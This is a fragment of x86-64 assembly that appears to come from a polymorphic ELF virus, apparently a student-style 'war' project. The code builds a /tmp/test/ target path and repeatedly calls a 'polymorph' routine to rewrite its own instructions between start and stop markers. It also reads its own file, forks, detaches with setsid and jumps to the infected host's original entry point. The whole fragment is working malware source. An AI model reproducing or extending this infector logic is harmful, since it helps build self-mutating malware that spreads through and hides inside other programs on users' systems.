_encrypted_start:

    PUSH_ALL
	lea		rdi, [rel path]
	mov		rcx, 512
	xor		rax, rax
	NOP
	NOP
	NOP
	NOP
	rep		stosq
	lea		rax, [rel path]
	mov		[rax], byte '/'
	inc		rax
	mov		[rax], byte 't'
	inc		rax
	mov		[rax], byte 'm'
	inc		rax
	mov		[rax], byte 'p'
	inc		rax
	mov		[rax], byte '/'
	inc		rax
	mov		[rax], byte 't'
	inc		rax
	mov		[rax], byte 'e'
	inc		rax
	mov		[rax], byte 's'
	inc		rax
	mov		[rax], byte 't'
	inc		rax
	mov		[rax], byte '/'
	inc		rax

	mov		rax, [rbp + 8]
	;lea		rax, [rel _start]

	mov		rdi, [rbp + 16]
	;lea		rdi, [rel _stop]


	lea		rdx, [rel templates_rdi]
	mov		r8, 7
	mov		r9, 4
	call	polymorph
	lea		rdx, [rel templates_rax]
	call	polymorph
	lea		rdx, [rel templates_rsi]
	call	polymorph
	lea		rdx, [rel templates_rdx]
	call	polymorph
	lea		rdx, [rel templates_rcx]
	call	polymorph
	lea		rdx, [rel templates_r10]
	call	polymorph
	lea		rdx, [rel templates_r11]
	call	polymorph
	lea		rdx, [rel templates_r13]
	call	polymorph
	lea		rdx, [rel templates_r15]
	call	polymorph


	mov		rax, SYS_open
	lea		rdi, [rel self]
	xor		rsi, rsi
	NOP
	NOP
	NOP
	NOP
	xor		rdx, rdx
	NOP
	NOP
	NOP
	NOP
	syscall
	cmp		rax, 0

	jle		.just_quit
	mov		r12, rax
	mov		rax, SYS_pread64
	mov		rdi, r12
	lea		rsi, [rel zero]
	mov		rdx, 1
	mov		r10, 10
	syscall

	.just_quit:
	mov		rax, SYS_close
	mov		rdi, r12
	syscall

	POP_ALL
	mov		al, BYTE [rel zero]	; SI ICI = 0, ca signfiie c'est war
	test	al, al
	jz		.continue

	mov		rax, SYS_fork
	syscall
	cmp		eax, 0
	jng		.continue_fork

	mov		rax, [rel entry]
	mov		[rel new_entry], rax
	mov		rax, [rel new_entry]
	sub		rax, [rel old_entry]

	mov		rdi, [rbp + 8]
	;lea		rdi, [rel _start]


	sub		rdi, rax
	mov		[rel new_entry], rdi

	add		rsp, 64
	jmp		[rel new_entry]

.continue_fork:
	mov		rax, SYS_setsid
	syscall
.continue:
